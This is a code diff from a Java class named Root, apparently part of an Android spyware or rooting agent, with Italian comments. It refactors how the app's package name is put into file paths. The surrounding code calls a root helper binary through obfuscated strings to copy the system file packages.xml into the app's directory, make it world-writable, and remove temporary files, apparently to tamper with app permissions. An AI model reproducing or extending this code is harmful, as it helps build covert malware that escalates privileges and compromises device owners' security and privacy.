@@ -604,6 +604,8 @@ public class Root {
 		try {
 			Execute ex = new Execute();
 
+			String pack = Status.self().getAppContext().getPackageName();
+			
 			// Runtime.getRuntime().exec("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
 			// Creiamo la directory files
 			Status.getAppContext().openFileOutput("test", Context.MODE_WORLD_READABLE);
@@ -611,15 +613,15 @@ public class Root {
 			// Copiamo packages.xml nel nostro path e rendiamolo scrivibile
 			// /system/bin/ntpsvd fhc /data/system/packages.xml
 			// /data/data/com.android.service/files/packages.xml
-			ex.execute(M.e("/system/bin/rilcap fhc /data/system/packages.xml /data/data/$PACK$/files/packages.xml"));
+			ex.execute(String.format(M.e("/system/bin/rilcap fhc /data/system/packages.xml /data/data/%s/files/packages.xml"), pack));
 			Utils.sleep(600);
 			// /system/bin/ntpsvd pzm 666
 			// /data/data/com.android.service/files/packages.xml
-			ex.execute(M.e("/system/bin/rilcap pzm 666 /data/data/$PACK$/files/packages.xml"));
+			ex.execute(String.format(M.e("/system/bin/rilcap pzm 666 /data/data/%s/files/packages.xml"), pack));
 
 			// Rimuoviamo il file temporaneo
 			// /data/data/com.android.service/files/test
-			File tmp = new File(M.e("/data/data/$PACK$/files/test"));
+			File tmp = new File(String.format(M.e("/data/data/%s/files/test"), pack));
 
 			if (tmp.exists() == true) {
 				tmp.delete();
@@ -636,7 +638,7 @@ public class Root {
 			if (path.length() == 0) {
 				return 0;
 			}
-			String pack = Status.self().getAppContext().getPackageName();
+			
 			
 			// Vediamo se gia' ci sono i permessi richiesti
 			if (pi.checkRequiredPermission() == true) {
